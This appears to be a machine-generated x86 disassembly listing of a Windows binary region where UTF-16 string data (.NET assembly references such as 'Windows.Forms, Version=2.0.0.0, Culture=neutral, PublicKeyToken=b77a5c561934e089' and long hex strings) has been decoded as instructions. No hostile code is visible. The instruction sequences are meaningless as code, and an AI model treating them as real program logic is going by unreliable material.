  40af97:	add    BYTE PTR [ebp+0x0],ah
  40af9a:	jns    0x40af9c
  40af9c:	push   esp
  40af9d:	add    BYTE PTR [edi+0x0],ch
  40afa0:	imul   eax,DWORD PTR [eax],0x65
  40afa3:	add    BYTE PTR [esi+0x0],ch
  40afa6:	cmp    eax,0x37006200
  40afab:	add    BYTE PTR [edi],dh
  40afad:	add    BYTE PTR [ecx+0x0],ah
  40afb0:	xor    eax,0x35006300
  40afb5:	add    BYTE PTR [esi],dh
  40afb7:	add    BYTE PTR [ecx],dh
  40afb9:	add    BYTE PTR [ecx],bh
  40afbb:	add    BYTE PTR [ebx],dh
  40afbd:	add    BYTE PTR [eax+eax*1],dh
  40afc0:	add    BYTE PTR gs:[eax],dh
  40afc3:	add    BYTE PTR [eax],bh
  40afc5:	add    BYTE PTR [ecx],bh
  40afc7:	add    BYTE PTR [eax+0x790053b4],al
  40afcd:	add    BYTE PTR [ebx+0x0],dh
  40afd0:	je     0x40afd2
  40afd2:	add    BYTE PTR gs:[ebp+0x0],ch
  40afd6:	add    BYTE PTR cs:[edx+0x0],dl
  40afda:	jne    0x40afdc
  40afdc:	outs   dx,BYTE PTR ds:[esi]
  40afdd:	add    BYTE PTR [eax+eax*1+0x69],dh
  40afe1:	add    BYTE PTR [ebp+0x0],ch
  40afe4:	add    BYTE PTR gs:[esi],ch
  40afe7:	add    BYTE PTR [edx+0x0],dl
  40afea:	add    BYTE PTR gs:[ebp+0x0],ch
  40afee:	outs   dx,DWORD PTR ds:[esi]
  40afef:	add    BYTE PTR [eax+eax*1+0x69],dh
  40aff3:	add    BYTE PTR [esi+0x0],ch
  40aff6:	add    BYTE PTR [si],ch
  40aff9:	add    BYTE PTR [eax],ah
  40affb:	add    BYTE PTR [esi+0x0],dl
  40affe:	add    BYTE PTR gs:[edx+0x0],dh
  40b002:	jae    0x40b004
  40b004:	imul   eax,DWORD PTR [eax],0x6e006f
  40b00a:	cmp    eax,0x2e003200
  40b00f:	add    BYTE PTR [eax],dh
  40b011:	add    BYTE PTR [esi],ch
  40b013:	add    BYTE PTR [eax],dh
  40b015:	add    BYTE PTR [esi],ch
  40b017:	add    BYTE PTR [eax],dh
  40b019:	add    BYTE PTR [eax+eax*1],ch
  40b01c:	and    BYTE PTR [eax],al
  40b01e:	inc    ebx
  40b01f:	add    BYTE PTR [ebp+0x0],dh
  40b022:	ins    BYTE PTR es:[edi],dx
  40b023:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b027:	add    BYTE PTR [edx+0x0],dh
  40b02a:	add    BYTE PTR gs:0x65006e00,bh
  40b031:	add    BYTE PTR [ebp+0x0],dh
  40b034:	je     0x40b036
  40b036:	jb     0x40b038
  40b038:	popa   
  40b039:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b03d:	add    BYTE PTR [eax],ah
  40b03f:	add    BYTE PTR [eax+0x0],dl
  40b042:	jne    0x40b044
  40b044:	bound  eax,QWORD PTR [eax]
  40b046:	ins    BYTE PTR es:[edi],dx
  40b047:	add    BYTE PTR [ecx+0x0],ch
  40b04a:	arpl   WORD PTR [eax],ax
  40b04c:	dec    ebx
  40b04d:	add    BYTE PTR [ebp+0x0],ah
  40b050:	jns    0x40b052
  40b052:	push   esp
  40b053:	add    BYTE PTR [edi+0x0],ch
  40b056:	imul   eax,DWORD PTR [eax],0x65
  40b059:	add    BYTE PTR [esi+0x0],ch
  40b05c:	cmp    eax,0x37006200
  40b061:	add    BYTE PTR [edi],dh
  40b063:	add    BYTE PTR [ecx+0x0],ah
  40b066:	xor    eax,0x35006300
  40b06b:	add    BYTE PTR [esi],dh
  40b06d:	add    BYTE PTR [ecx],dh
  40b06f:	add    BYTE PTR [ecx],bh
  40b071:	add    BYTE PTR [ebx],dh
  40b073:	add    BYTE PTR [eax+eax*1],dh
  40b076:	add    BYTE PTR gs:[eax],dh
  40b079:	add    BYTE PTR [eax],bh
  40b07b:	add    BYTE PTR [ecx],bh
  40b07d:	add    BYTE PTR [eax+0x790053ae],al
  40b083:	add    BYTE PTR [ebx+0x0],dh
  40b086:	je     0x40b088
  40b088:	add    BYTE PTR gs:[ebp+0x0],ch
  40b08c:	add    BYTE PTR cs:[edi+0x0],dl
  40b090:	imul   eax,DWORD PTR [eax],0x64006e
  40b096:	outs   dx,DWORD PTR ds:[esi]
  40b097:	add    BYTE PTR [edi+0x0],dh
  40b09a:	jae    0x40b09c
  40b09c:	add    BYTE PTR cs:[esi+0x0],al
  40b0a0:	outs   dx,DWORD PTR ds:[esi]
  40b0a1:	add    BYTE PTR [edx+0x0],dh
  40b0a4:	ins    DWORD PTR es:[edi],dx
  40b0a5:	add    BYTE PTR [ebx+0x0],dh
  40b0a8:	sub    al,0x0
  40b0aa:	and    BYTE PTR [eax],al
  40b0ac:	push   esi
  40b0ad:	add    BYTE PTR [ebp+0x0],ah
  40b0b0:	jb     0x40b0b2
  40b0b2:	jae    0x40b0b4
  40b0b4:	imul   eax,DWORD PTR [eax],0x6e006f
  40b0ba:	cmp    eax,0x2e003200
  40b0bf:	add    BYTE PTR [eax],dh
  40b0c1:	add    BYTE PTR [esi],ch
  40b0c3:	add    BYTE PTR [eax],dh
  40b0c5:	add    BYTE PTR [esi],ch
  40b0c7:	add    BYTE PTR [eax],dh
  40b0c9:	add    BYTE PTR [eax+eax*1],ch
  40b0cc:	and    BYTE PTR [eax],al
  40b0ce:	inc    ebx
  40b0cf:	add    BYTE PTR [ebp+0x0],dh
  40b0d2:	ins    BYTE PTR es:[edi],dx
  40b0d3:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b0d7:	add    BYTE PTR [edx+0x0],dh
  40b0da:	add    BYTE PTR gs:0x65006e00,bh
  40b0e1:	add    BYTE PTR [ebp+0x0],dh
  40b0e4:	je     0x40b0e6
  40b0e6:	jb     0x40b0e8
  40b0e8:	popa   
  40b0e9:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b0ed:	add    BYTE PTR [eax],ah
  40b0ef:	add    BYTE PTR [eax+0x0],dl
  40b0f2:	jne    0x40b0f4
  40b0f4:	bound  eax,QWORD PTR [eax]
  40b0f6:	ins    BYTE PTR es:[edi],dx
  40b0f7:	add    BYTE PTR [ecx+0x0],ch
  40b0fa:	arpl   WORD PTR [eax],ax
  40b0fc:	dec    ebx
  40b0fd:	add    BYTE PTR [ebp+0x0],ah
  40b100:	jns    0x40b102
  40b102:	push   esp
  40b103:	add    BYTE PTR [edi+0x0],ch
  40b106:	imul   eax,DWORD PTR [eax],0x65
  40b109:	add    BYTE PTR [esi+0x0],ch
  40b10c:	cmp    eax,0x37006200
  40b111:	add    BYTE PTR [edi],dh
  40b113:	add    BYTE PTR [ecx+0x0],ah
  40b116:	xor    eax,0x35006300
  40b11b:	add    BYTE PTR [esi],dh
  40b11d:	add    BYTE PTR [ecx],dh
  40b11f:	add    BYTE PTR [ecx],bh
  40b121:	add    BYTE PTR [ebx],dh
  40b123:	add    BYTE PTR [eax+eax*1],dh
  40b126:	add    BYTE PTR gs:[eax],dh
  40b129:	add    BYTE PTR [eax],bh
  40b12b:	add    BYTE PTR [ecx],bh
  40b12d:	add    BYTE PTR [eax+0x7900539a],al
  40b133:	add    BYTE PTR [ebx+0x0],dh
  40b136:	je     0x40b138
  40b138:	add    BYTE PTR gs:[ebp+0x0],ch
  40b13c:	add    BYTE PTR cs:[eax+0x0],bl
  40b140:	ins    DWORD PTR es:[edi],dx
  40b141:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b145:	add    BYTE PTR [eax],ah
  40b147:	add    BYTE PTR [esi+0x0],dl
  40b14a:	add    BYTE PTR gs:[edx+0x0],dh
  40b14e:	jae    0x40b150
  40b150:	imul   eax,DWORD PTR [eax],0x6e006f
  40b156:	cmp    eax,0x2e003200
  40b15b:	add    BYTE PTR [eax],dh
  40b15d:	add    BYTE PTR [esi],ch
  40b15f:	add    BYTE PTR [eax],dh
  40b161:	add    BYTE PTR [esi],ch
  40b163:	add    BYTE PTR [eax],dh
  40b165:	add    BYTE PTR [eax+eax*1],ch
  40b168:	and    BYTE PTR [eax],al
  40b16a:	inc    ebx
  40b16b:	add    BYTE PTR [ebp+0x0],dh
  40b16e:	ins    BYTE PTR es:[edi],dx
  40b16f:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b173:	add    BYTE PTR [edx+0x0],dh
  40b176:	add    BYTE PTR gs:0x65006e00,bh
  40b17d:	add    BYTE PTR [ebp+0x0],dh
  40b180:	je     0x40b182
  40b182:	jb     0x40b184
  40b184:	popa   
  40b185:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b189:	add    BYTE PTR [eax],ah
  40b18b:	add    BYTE PTR [eax+0x0],dl
  40b18e:	jne    0x40b190
  40b190:	bound  eax,QWORD PTR [eax]
  40b192:	ins    BYTE PTR es:[edi],dx
  40b193:	add    BYTE PTR [ecx+0x0],ch
  40b196:	arpl   WORD PTR [eax],ax
  40b198:	dec    ebx
  40b199:	add    BYTE PTR [ebp+0x0],ah
  40b19c:	jns    0x40b19e
  40b19e:	push   esp
  40b19f:	add    BYTE PTR [edi+0x0],ch
  40b1a2:	imul   eax,DWORD PTR [eax],0x65
  40b1a5:	add    BYTE PTR [esi+0x0],ch
  40b1a8:	cmp    eax,0x37006200
  40b1ad:	add    BYTE PTR [edi],dh
  40b1af:	add    BYTE PTR [ecx+0x0],ah
  40b1b2:	xor    eax,0x35006300
  40b1b7:	add    BYTE PTR [esi],dh
  40b1b9:	add    BYTE PTR [ecx],dh
  40b1bb:	add    BYTE PTR [ecx],bh
  40b1bd:	add    BYTE PTR [ebx],dh
  40b1bf:	add    BYTE PTR [eax+eax*1],dh
  40b1c2:	add    BYTE PTR gs:[eax],dh
  40b1c5:	add    BYTE PTR [eax],bh
  40b1c7:	add    BYTE PTR [ecx],bh
  40b1c9:	add    BYTE PTR [eax],ah
  40b1cb:	bound  eax,QWORD PTR [eax]
  40b1cd:	xor    BYTE PTR [eax],al
  40b1cf:	xor    eax,DWORD PTR [eax]
  40b1d1:	data16 add BYTE PTR ds:0x37006600,dh
  40b1d8:	add    BYTE PTR [esi+0x0],ah
  40b1db:	xor    DWORD PTR [eax],eax
  40b1dd:	xor    DWORD PTR [eax],eax
  40b1df:	add    BYTE PTR fs:0x61003000,dh
  40b1e6:	add    BYTE PTR [ebx],dh
  40b1e8:	add    BYTE PTR [ecx+0x0],ah
  40b1eb:	add    BYTE PTR [eax+0x300030],0x32
  40b1f2:	add    BYTE PTR [eax+eax*1],dh
  40b1f5:	xor    BYTE PTR [eax],al
  40b1f7:	xor    BYTE PTR [eax],al
  40b1f9:	xor    BYTE PTR [eax],al
  40b1fb:	xor    BYTE PTR [eax],al
  40b1fd:	xor    BYTE PTR [eax],al
  40b1ff:	xor    al,0x0
  40b201:	cmp    BYTE PTR [eax],al
  40b203:	xor    BYTE PTR [eax],al
  40b205:	xor    BYTE PTR [eax],al
  40b207:	xor    BYTE PTR [eax],al
  40b209:	xor    BYTE PTR [eax],al
  40b20b:	xor    BYTE PTR [eax],al
  40b20d:	cmp    DWORD PTR [eax],eax
  40b20f:	xor    al,0x0
  40b211:	xor    BYTE PTR [eax],al
  40b213:	xor    BYTE PTR [eax],al
  40b215:	xor    BYTE PTR [eax],al
  40b217:	xor    BYTE PTR [eax],al
  40b219:	xor    BYTE PTR [eax],al
  40b21b:	xor    BYTE PTR [eax],al
  40b21d:	xor    BYTE PTR [eax],al
  40b21f:	add    BYTE PTR ss:[eax],dh
  40b222:	add    BYTE PTR [edx],dh
  40b224:	add    BYTE PTR [eax],dh
  40b226:	add    BYTE PTR [eax],dh
  40b228:	add    BYTE PTR [eax],dh
  40b22a:	add    BYTE PTR [eax],dh
  40b22c:	add    BYTE PTR [eax],dh
  40b22e:	add    BYTE PTR [eax],dh
  40b230:	add    BYTE PTR [edx],dh
  40b232:	add    BYTE PTR [eax+eax*1],dh
  40b235:	xor    BYTE PTR [eax],al
  40b237:	xor    BYTE PTR [eax],al
  40b239:	xor    BYTE PTR [eax],al
  40b23b:	xor    BYTE PTR [eax],al
  40b23d:	xor    eax,0x35003200
  40b242:	add    BYTE PTR [ebx],dh
  40b244:	add    BYTE PTR [eax+eax*1],dh
  40b247:	xor    DWORD PTR [eax],eax
  40b249:	xor    eax,DWORD PTR [eax]
  40b24b:	xor    DWORD PTR [eax],eax
  40b24d:	xor    BYTE PTR [eax],al
  40b24f:	xor    BYTE PTR [eax],al
  40b251:	xor    BYTE PTR [eax],al
  40b253:	xor    al,0x0
  40b255:	xor    BYTE PTR [eax],al
  40b257:	xor    BYTE PTR [eax],al
  40b259:	xor    BYTE PTR [eax],al
  40b25b:	xor    BYTE PTR [eax],al
  40b25d:	xor    BYTE PTR [eax],al
  40b25f:	xor    DWORD PTR [eax],eax
  40b261:	xor    BYTE PTR [eax],al
  40b263:	xor    BYTE PTR [eax],al
  40b265:	xor    BYTE PTR [eax],al
  40b267:	xor    DWORD PTR [eax],eax
  40b269:	xor    BYTE PTR [eax],al
  40b26b:	xor    BYTE PTR [eax],al
  40b26d:	xor    BYTE PTR [eax],al
  40b26f:	aaa    
  40b270:	add    BYTE PTR [eax+eax*1+0x31],al
  40b274:	add    BYTE PTR [esi+0x0],al
  40b277:	inc    ecx
  40b278:	add    BYTE PTR ds:0x43003700,dh
  40b27e:	add    BYTE PTR [eax+eax*1],dh
  40b281:	inc    ecx
  40b282:	add    BYTE PTR [ebp+0x0],al
  40b285:	inc    esp
  40b286:	add    BYTE PTR [ecx],bh
  40b288:	add    BYTE PTR [esi+0x0],al
  40b28b:	xor    BYTE PTR [eax],al
  40b28d:	inc    ecx
  40b28e:	add    BYTE PTR [ebx],dh
  40b290:	add    BYTE PTR [edx],dh
  40b292:	add    BYTE PTR [ebp+0x0],al
  40b295:	cmp    BYTE PTR [eax],al
  40b297:	xor    al,0x0
  40b299:	inc    ecx
  40b29a:	add    BYTE PTR [ecx+0x0],al
  40b29d:	xor    BYTE PTR [eax],al
  40b29f:	inc    esi
  40b2a0:	add    BYTE PTR [ecx+0x0],al
  40b2a3:	inc    ebp
  40b2a4:	add    BYTE PTR [esi+0x0],al
  40b2a7:	inc    esp
  40b2a8:	add    BYTE PTR [eax],dh
  40b2aa:	add    BYTE PTR [eax+eax*1+0x45],al
  40b2ae:	add    BYTE PTR [ecx],bh
  40b2b0:	add    BYTE PTR [ebp+0x0],al
  40b2b3:	cmp    BYTE PTR [eax],al
  40b2b5:	inc    esi
  40b2b6:	add    BYTE PTR [eax+eax*1+0x36],al
  40b2ba:	add    BYTE PTR [ecx+0x0],al
  40b2bd:	inc    ebp
  40b2be:	add    BYTE PTR [ebx+0x0],al
  40b2c1:	cmp    BYTE PTR [eax],al
  40b2c3:	inc    esi
  40b2c4:	add    BYTE PTR [eax],bh
  40b2c6:	add    BYTE PTR [edi],dh
  40b2c8:	add    BYTE PTR [esi+0x0],al
  40b2cb:	inc    edx
  40b2cc:	add    BYTE PTR [eax],dh
  40b2ce:	add    BYTE PTR [ebx],dh
  40b2d0:	add    BYTE PTR [edi],dh
  40b2d2:	add    BYTE PTR [esi],dh
  40b2d4:	add    BYTE PTR [esi],dh
  40b2d6:	add    BYTE PTR [ebx+0x0],al
  40b2d9:	cmp    BYTE PTR [eax],al
  40b2db:	xor    eax,DWORD PTR [eax]
  40b2dd:	xor    al,0x0
  40b2df:	inc    ebx
  40b2e0:	add    BYTE PTR [ecx],bh
  40b2e2:	add    BYTE PTR [ecx],bh
  40b2e4:	add    BYTE PTR [ecx],bh
  40b2e6:	add    BYTE PTR [edx],dh
  40b2e8:	add    BYTE PTR [ecx],dh
  40b2ea:	add    BYTE PTR [ebp+0x0],al
  40b2ed:	inc    edx
  40b2ee:	add    BYTE PTR [edx],dh
  40b2f0:	add    BYTE PTR [ebx],dh
  40b2f2:	add    BYTE PTR [edx+0x0],al
  40b2f5:	inc    ebp
  40b2f6:	add    BYTE PTR [edi],dh
  40b2f8:	add    BYTE PTR [ecx],bh
  40b2fa:	add    BYTE PTR [ecx+0x0],al
  40b2fd:	inc    esp
  40b2fe:	add    BYTE PTR [ecx],bh
  40b300:	add    BYTE PTR [eax+eax*1+0x35],al
  40b304:	add    BYTE PTR [eax+eax*1+0x43],al
  40b308:	add    BYTE PTR [ebx+0x0],al
  40b30b:	xor    DWORD PTR [eax],eax
  40b30d:	inc    esp
  40b30e:	add    BYTE PTR [eax+eax*1+0x39],al
  40b312:	add    BYTE PTR [ecx+0x0],al
  40b315:	inc    esp
  40b316:	add    BYTE PTR [edx],dh
  40b318:	add    BYTE PTR [ebx],dh
  40b31a:	add    BYTE PTR [esi],dh
  40b31c:	add    BYTE PTR [ecx],dh
  40b31e:	add    BYTE PTR [ebx],dh
  40b320:	add    BYTE PTR [edx],dh
  40b322:	add    BYTE PTR [ecx],dh
  40b324:	add    BYTE PTR [eax],dh
  40b326:	add    BYTE PTR [edx],dh
  40b328:	add    BYTE PTR [ecx],bh
  40b32a:	add    BYTE PTR [eax],dh
  40b32c:	add    BYTE PTR [eax],dh
  40b32e:	add    BYTE PTR [edx+0x0],al
  40b331:	aaa    
  40b332:	add    BYTE PTR [edx],dh
  40b334:	add    BYTE PTR [ebx],dh
  40b336:	add    BYTE PTR [ebx+0x0],al
  40b339:	inc    esi
  40b33a:	add    BYTE PTR [ecx],bh
  40b33c:	add    BYTE PTR [eax],bh
  40b33e:	add    BYTE PTR [eax],dh
  40b340:	add    BYTE PTR [ecx],bh
  40b342:	add    BYTE PTR ds:0x46003700,dh
  40b348:	add    BYTE PTR [ebx+0x0],al
  40b34b:	xor    al,0x0
  40b34d:	inc    ebp
  40b34e:	add    BYTE PTR [ecx],dh
  40b350:	add    BYTE PTR [edi],dh
  40b352:	add    BYTE PTR [edi],dh
  40b354:	add    BYTE PTR [ecx],dh
  40b356:	add    BYTE PTR [eax],dh
  40b358:	add    BYTE PTR [eax],bh
  40b35a:	add    BYTE PTR [esi+0x0],al
  40b35d:	inc    ebx
  40b35e:	add    BYTE PTR [esi],dh
  40b360:	add    BYTE PTR [eax],dh
  40b362:	add    BYTE PTR [edi],dh
  40b364:	add    BYTE PTR [edi],dh
  40b366:	add    BYTE PTR [edi],dh
  40b368:	add    BYTE PTR [eax+eax*1],dh
  40b36b:	inc    esi
  40b36c:	add    BYTE PTR [edx],dh
  40b36e:	add    BYTE PTR [ecx],bh
  40b370:	add    BYTE PTR [ebp+0x0],al
  40b373:	cmp    BYTE PTR [eax],al
  40b375:	xor    eax,DWORD PTR [eax]
  40b377:	xor    al,BYTE PTR [eax]
  40b379:	xor    BYTE PTR [eax],al
  40b37b:	inc    ebp
  40b37c:	add    BYTE PTR [ecx],bh
  40b37e:	add    BYTE PTR [edx],dh
  40b380:	add    BYTE PTR [ebp+0x0],al
  40b383:	inc    ecx
  40b384:	add    BYTE PTR [eax],dh
  40b386:	add    BYTE PTR ds:0x43004500,dh
  40b38c:	add    BYTE PTR [ebp+0x0],al
  40b38f:	xor    al,0x0
  40b391:	inc    ebp
  40b392:	add    BYTE PTR [eax],bh
  40b394:	add    BYTE PTR [edx],dh
  40b396:	add    BYTE PTR [ecx],dh
  40b398:	add    BYTE PTR [ebx+0x0],al
  40b39b:	xor    BYTE PTR [eax],al
  40b39d:	inc    ecx
  40b39e:	add    BYTE PTR ds:0x46004500,dh
  40b3a4:	add    BYTE PTR [ebp+0x0],al
  40b3a7:	cmp    BYTE PTR [eax],al
  40b3a9:	inc    esi
  40b3aa:	add    BYTE PTR [ecx],dh
  40b3ac:	add    BYTE PTR [esi],dh
  40b3ae:	add    BYTE PTR [eax+eax*1],dh
  40b3b1:	xor    eax,0x34004300
  40b3b6:	add    BYTE PTR [ebx+0x0],al
  40b3b9:	xor    BYTE PTR [eax],al
  40b3bb:	inc    ebx
  40b3bc:	add    BYTE PTR [ecx],bh
  40b3be:	add    BYTE PTR [ebx],dh
  40b3c0:	add    BYTE PTR [ebx+0x0],al
  40b3c3:	xor    DWORD PTR [eax],eax
  40b3c5:	inc    ecx
  40b3c6:	add    BYTE PTR [edx+0x0],al
  40b3c9:	cmp    DWORD PTR [eax],eax
  40b3cb:	cmp    DWORD PTR [eax],eax
  40b3cd:	xor    al,BYTE PTR [eax]
  40b3cf:	cmp    BYTE PTR [eax],al
  40b3d1:	xor    eax,0x36004400
  40b3d6:	add    BYTE PTR [edx],dh
  40b3d8:	add    BYTE PTR [edx],dh
  40b3da:	add    BYTE PTR [ebx+0x0],al
  40b3dd:	inc    ecx
  40b3de:	add    BYTE PTR [ecx+0x0],al
  40b3e1:	add    BYTE PTR ss:0x43003200,dh
  40b3e8:	add    BYTE PTR [ecx],dh
  40b3ea:	add    BYTE PTR [eax+eax*1+0x46],al
  40b3ee:	add    BYTE PTR [ecx+0x0],al
  40b3f1:	inc    esp
  40b3f2:	add    BYTE PTR [esi],dh
  40b3f4:	add    BYTE PTR [ebx],dh
  40b3f6:	add    BYTE PTR [eax+eax*1+0x37],al
  40b3fa:	add    BYTE PTR [eax+eax*1],dh
  40b3fd:	xor    eax,0x36004400
  40b402:	add    BYTE PTR [esi+0x0],al
  40b405:	xor    al,BYTE PTR [eax]
  40b407:	inc    esp
  40b408:	add    BYTE PTR [ebp+0x0],al
  40b40b:	xor    eax,0x31004600
  40b410:	add    BYTE PTR [edi],dh
  40b412:	add    BYTE PTR [ebp+0x0],al
  40b415:	xor    eax,0x41004500
  40b41a:	add    BYTE PTR [esi+0x0],al
  40b41d:	xor    BYTE PTR [eax],al
  40b41f:	inc    esi
  40b420:	add    BYTE PTR [ebx+0x0],al
  40b423:	xor    al,0x0
  40b425:	cmp    DWORD PTR [eax],eax
  40b427:	add    BYTE PTR ss:[ebx],dh
  40b42a:	add    BYTE PTR [eax+eax*1+0x32],al
  40b42e:	add    BYTE PTR [esi],dh
  40b430:	add    BYTE PTR [ecx],dh
  40b432:	add    BYTE PTR [ebx+0x0],al
  40b435:	cmp    BYTE PTR [eax],al
  40b437:	inc    ecx
  40b438:	add    BYTE PTR [ecx],dh
  40b43a:	add    BYTE PTR [edx],dh
  40b43c:	add    BYTE PTR [eax+eax*1],dh
  40b43f:	xor    eax,DWORD PTR [eax]
  40b441:	add    BYTE PTR ss:0x38003100,dh
  40b448:	add    BYTE PTR [edx],dh
  40b44a:	add    BYTE PTR [eax],dh
  40b44c:	add    BYTE PTR [esi],dh
  40b44e:	add    BYTE PTR [eax+eax*1+0x43],al
  40b452:	add    BYTE PTR [eax],dh
  40b454:	add    BYTE PTR [ecx],bh
  40b456:	add    BYTE PTR [ebx],dh
  40b458:	add    BYTE PTR [ebx],dh
  40b45a:	add    BYTE PTR [eax+eax*1],dh
  40b45d:	xor    al,0x0
  40b45f:	inc    esp
  40b460:	add    BYTE PTR ds:0x44004100,dh
  40b466:	add    BYTE PTR [edx],dh
  40b468:	add    BYTE PTR [ecx],bh
  40b46a:	add    BYTE PTR [ebx],dh
  40b46c:	add    BYTE PTR [eax],ah
  40b46e:	xor    eax,DWORD PTR [eax]
  40b470:	xor    DWORD PTR [eax],eax
  40b472:	bound  eax,QWORD PTR [eax]
  40b474:	data16 add BYTE PTR [ebx],dh
  40b477:	add    BYTE PTR [eax],bh
  40b479:	add    BYTE PTR ds:0x61003600,dh
  40b47f:	add    BYTE PTR [eax+eax*1+0x33],ah
  40b483:	add    BYTE PTR [esi],dh
  40b485:	add    BYTE PTR [eax+eax*1],dh
  40b488:	add    BYTE PTR gs:[ebx],dh
  40b48b:	add    BYTE PTR ds:0x30808200,dh
  40b491:	add    BYTE PTR [eax],dh
  40b493:	add    BYTE PTR [edx],dh
  40b495:	add    BYTE PTR [eax+eax*1],dh
  40b498:	xor    BYTE PTR [eax],al
  40b49a:	xor    BYTE PTR [eax],al
  40b49c:	xor    BYTE PTR [eax],al
  40b49e:	xor    BYTE PTR [eax],al
  40b4a0:	xor    BYTE PTR [eax],al
  40b4a2:	xor    al,0x0
  40b4a4:	cmp    BYTE PTR [eax],al
  40b4a6:	xor    BYTE PTR [eax],al
  40b4a8:	xor    BYTE PTR [eax],al
  40b4aa:	xor    BYTE PTR [eax],al
  40b4ac:	xor    BYTE PTR [eax],al
  40b4ae:	xor    BYTE PTR [eax],al
  40b4b0:	cmp    DWORD PTR [eax],eax
  40b4b2:	xor    al,0x0
  40b4b4:	xor    BYTE PTR [eax],al
  40b4b6:	xor    BYTE PTR [eax],al
  40b4b8:	xor    BYTE PTR [eax],al
  40b4ba:	xor    BYTE PTR [eax],al
  40b4bc:	xor    BYTE PTR [eax],al
  40b4be:	xor    BYTE PTR [eax],al
  40b4c0:	xor    BYTE PTR [eax],al
  40b4c2:	add    BYTE PTR ss:[eax],dh
  40b4c5:	add    BYTE PTR [edx],dh
  40b4c7:	add    BYTE PTR [eax],dh
  40b4c9:	add    BYTE PTR [eax],dh
  40b4cb:	add    BYTE PTR [eax],dh
  40b4cd:	add    BYTE PTR [eax],dh
  40b4cf:	add    BYTE PTR [eax],dh
  40b4d1:	add    BYTE PTR [eax],dh
  40b4d3:	add    BYTE PTR [edx],dh
  40b4d5:	add    BYTE PTR [eax+eax*1],dh
  40b4d8:	xor    BYTE PTR [eax],al
  40b4da:	xor    BYTE PTR [eax],al
  40b4dc:	xor    BYTE PTR [eax],al
  40b4de:	xor    BYTE PTR [eax],al
  40b4e0:	xor    eax,0x35003200
  40b4e5:	add    BYTE PTR [ebx],dh
  40b4e7:	add    BYTE PTR [eax+eax*1],dh
  40b4ea:	xor    DWORD PTR [eax],eax
  40b4ec:	xor    eax,DWORD PTR [eax]
  40b4ee:	xor    DWORD PTR [eax],eax
  40b4f0:	xor    BYTE PTR [eax],al
  40b4f2:	xor    BYTE PTR [eax],al
  40b4f4:	xor    BYTE PTR [eax],al
  40b4f6:	xor    al,0x0
  40b4f8:	xor    BYTE PTR [eax],al
  40b4fa:	xor    BYTE PTR [eax],al
  40b4fc:	xor    BYTE PTR [eax],al
  40b4fe:	xor    BYTE PTR [eax],al
  40b500:	xor    BYTE PTR [eax],al
  40b502:	xor    DWORD PTR [eax],eax
  40b504:	xor    BYTE PTR [eax],al
  40b506:	xor    BYTE PTR [eax],al
  40b508:	xor    BYTE PTR [eax],al
  40b50a:	xor    DWORD PTR [eax],eax
  40b50c:	xor    BYTE PTR [eax],al
  40b50e:	xor    BYTE PTR [eax],al
  40b510:	inc    edx
  40b511:	add    BYTE PTR ds:0x43004600,dh
  40b517:	add    BYTE PTR [ecx],bh
  40b519:	add    BYTE PTR [eax],dh
  40b51b:	add    BYTE PTR [ebp+0x0],al
  40b51e:	aaa    
  40b51f:	add    BYTE PTR [eax],dh
  40b521:	add    BYTE PTR [edx],dh
  40b523:	add    BYTE PTR [edi],dh
  40b525:	add    BYTE PTR [esi+0x0],al
  40b528:	add    BYTE PTR ss:[edi],dh
  40b52b:	add    BYTE PTR [eax],bh
  40b52d:	add    BYTE PTR [edi],dh
  40b52f:	add    BYTE PTR [ecx],dh
  40b531:	add    BYTE PTR [ebp+0x0],al
  40b534:	aaa    
  40b535:	add    BYTE PTR [edi],dh
  40b537:	add    BYTE PTR [ebx],dh
  40b539:	add    BYTE PTR [ecx+0x0],al
  40b53c:	cmp    BYTE PTR [eax],al
  40b53e:	inc    esi
  40b53f:	add    BYTE PTR [eax+eax*1+0x45],al
  40b543:	add    BYTE PTR [eax],bh
  40b545:	add    BYTE PTR [ecx],bh
  40b547:	add    BYTE PTR [ebx],dh
  40b549:	add    BYTE PTR [eax],bh
  40b54b:	add    BYTE PTR [ebx+0x0],al
  40b54e:	cmp    BYTE PTR [eax],al
  40b550:	xor    DWORD PTR [eax],eax
  40b552:	inc    esp
  40b553:	add    BYTE PTR [eax+eax*1+0x34],al
  40b557:	add    BYTE PTR [eax],dh
  40b559:	add    BYTE PTR [edx],dh
  40b55b:	add    BYTE PTR [edx+0x0],al
  40b55e:	inc    ecx
  40b55f:	add    BYTE PTR [esi],dh
  40b561:	add    BYTE PTR ds:0x39004200,dh
  40b567:	add    BYTE PTR [edx],dh
  40b569:	add    BYTE PTR [eax],dh
  40b56b:	add    BYTE PTR [ecx],dh
  40b56d:	add    BYTE PTR [eax+eax*1+0x36],al
  40b571:	add    BYTE PTR [eax],dh
  40b573:	add    BYTE PTR ds:0x33003900,dh
  40b579:	add    BYTE PTR [ebp+0x0],al
  40b57c:	cmp    DWORD PTR [eax],eax
  40b57e:	add    BYTE PTR ss:[ebx+0x0],al
  40b582:	xor    al,0x0
  40b584:	cmp    DWORD PTR [eax],eax
  40b586:	xor    al,BYTE PTR [eax]
  40b588:	add    BYTE PTR ss:0x45003100,dh
  40b58f:	add    BYTE PTR [eax],bh
  40b591:	add    BYTE PTR [eax],bh
  40b593:	add    BYTE PTR [ecx],bh
  40b595:	add    BYTE PTR [ebx+0x0],al
  40b598:	inc    ebx
  40b599:	add    BYTE PTR [ecx],dh
  40b59b:	add    BYTE PTR [ebx],dh
  40b59d:	add    BYTE PTR [esi+0x0],al
  40b5a0:	xor    DWORD PTR [eax],eax
  40b5a2:	xor    al,0x0
  40b5a4:	xor    DWORD PTR [eax],eax
  40b5a6:	xor    eax,0x42004500
  40b5ab:	add    BYTE PTR [edx+0x0],al
  40b5ae:	xor    eax,0x46003300
  40b5b3:	add    BYTE PTR [ecx+0x0],al
  40b5b6:	inc    ebx
  40b5b7:	add    BYTE PTR [ecx],dh
  40b5b9:	add    BYTE PTR [ecx],dh
  40b5bb:	add    BYTE PTR [ebx],dh
  40b5bd:	add    BYTE PTR [ecx],dh
  40b5bf:	add    BYTE PTR [ecx+0x0],al
  40b5c2:	inc    ebp
  40b5c3:	add    BYTE PTR [eax],dh
  40b5c5:	add    BYTE PTR [edx+0x0],al
  40b5c8:	inc    esp
